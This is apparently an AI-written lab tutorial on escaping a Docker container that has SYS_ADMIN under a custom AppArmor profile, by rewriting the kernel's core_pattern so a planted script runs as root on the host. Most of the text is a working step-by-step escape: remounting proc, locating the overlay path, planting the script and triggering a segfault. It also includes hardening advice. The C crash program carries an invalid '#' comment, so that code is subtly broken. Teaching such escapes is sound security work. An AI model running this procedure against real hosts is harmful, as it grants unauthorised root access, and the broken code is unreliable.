# Stage 4: Containers - AppArmor & Core Pattern Abuse

## Setup

First, we must apply the custom AppArmor profile that attempts to secure our container.

```bash
# 1. Move the profile to the system directory
sudo mv stage4 /etc/apparmor.d/stage4

# 2. Parse and load the profile
sudo apparmor_parser -r /etc/apparmor.d/stage4

# 3. Run the container with SYS_ADMIN capabilities and our custom profile
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=stage4 ubuntu bash
```

In the previous stages, we looked at Namespaces and Seccomp. Now we enter the world of **AppArmor (Application Armor)** and **Capabilities**.

Docker containers usually run with a restricted set of capabilities. However, sometimes developers grant `--cap-add=SYS_ADMIN` for administration tools or nested Docker scenarios. To mitigate the risk, they might apply a custom AppArmor profile to block known escape vectors.

In this stage, the administrator has blocked the famous "cgroup release\_agent" escape method by explicitly denying writes to cgroup release agents in the AppArmor profile:

```text
deny mount fstype = cgroup,
deny /sys/fs/cgroup/**/release_agent w,
```

At first glance, this seems secure. The standard `SYS_ADMIN` escape route is closed.

## Attack

The vulnerability lies in the fact that containers share the host's **Kernel**. While AppArmor restricted the cgroups, it failed to restrict access to the kernel's core dump handler: `core_pattern`.

When a Linux process crashes (e.g., via a segmentation fault), the kernel looks at `/proc/sys/kernel/core_pattern` to determine what to do. If this file starts with a pipe `|`, the kernel will **execute the specified program** to handle the crash.

Crucially, because the kernel manages this execution, the script defined in `core_pattern` runs with **root privileges on the host**, not inside the container.

We can exploit this by pointing `core_pattern` to a malicious script located in our container. However, the kernel needs the *host's* file path to our script, not the container's path.

Follow these steps inside the container to escape:

### 1\. Remount `/proc`

Since we have `SYS_ADMIN` and the AppArmor profile allows mounting, we can mount `proc` to access kernel system settings.

```bash
mount -t proc none /proc
```

### 2\. Identify the Container's Host Path

We need to find where our container's filesystem actually lives on the host. We can find this by looking at the `overlay` mount information.

```bash
# Extract the 'upperdir' path, which is our writable layer on the host
export HASH=$(mount | grep overlay | sed -n 's|.*upperdir=/var/lib/docker/overlay2/\([^/]*\)/diff.*|\1|p')
```

### 3\. Plant the Payload

We will create a shell script that writes to the host filesystem.

```bash
# Create the escape script
cat <<EOF > /escape.sh
#!/bin/sh
# Write to the host's filesystem (mapped via PID 1)
echo "Arcane magic!" > /proc/1/root/tmp/hex_crystal
EOF

# Make it executable
chmod +x /escape.sh
```

### 4\. Overwrite `core_pattern`

We tell the kernel: "When something crashes, run *this* script." Note that we use the full path we discovered in step 2.

```bash
echo "|/var/lib/docker/overlay2/$HASH/diff/escape.sh" > /proc/sys/kernel/core_pattern
```

### 5\. Trigger the Trap

Now we need to crash a program to trigger the `core_pattern`.

```bash
# Create a simple C program that forces a segmentation fault
cat <<EOF > crash.c
int main(void) {
    int *p = 0;
    *p = 1; # Dereferencing a null pointer causes a segfault
    return 0;
}
EOF

# Compile and run it
gcc crash.c -o crash
./crash
```

The program crashes, the kernel reads `core_pattern`, and executes our `/escape.sh` as root on the host. Check `/tmp/hex_crystal` on the host machine to confirm the escape.

## Hardening

To fix this, the AppArmor profile is insufficient if `SYS_ADMIN` is present. You must block write access to the entire `sysctl` interface or specifically the core pattern.

A robust AppArmor profile should include:

```text
deny /proc/sys/kernel/core_pattern w,
```

However, the best defense is **Defense in Depth**:

1.  **Never grant** `CAP_SYS_ADMIN` unless absolutely necessary.
2.  **User Namespaces:** Remap the container's `root` user to an unprivileged user on the host. Even if the process escapes via `core_pattern`, it would execute as a nobody on the host, limiting the damage.

## Beyond Containers

We have explored Namespaces, Seccomp filters, and AppArmor profiles. We've seen that as long as the container shares the kernel with the host, a sufficient capability (like `SYS_ADMIN`) can often be leveraged to manipulate that shared kernel state.

To achieve true isolation, we must move away from shared kernels entirely.

**-\> Move to Stage 5: Hypervisor Isolation (gVisor / Firecracker / Confidential Computing)**

-----

**Next Step:** Would you like me to generate the `stage5` artifacts focusing on gVisor or Kata Containers to continue this series?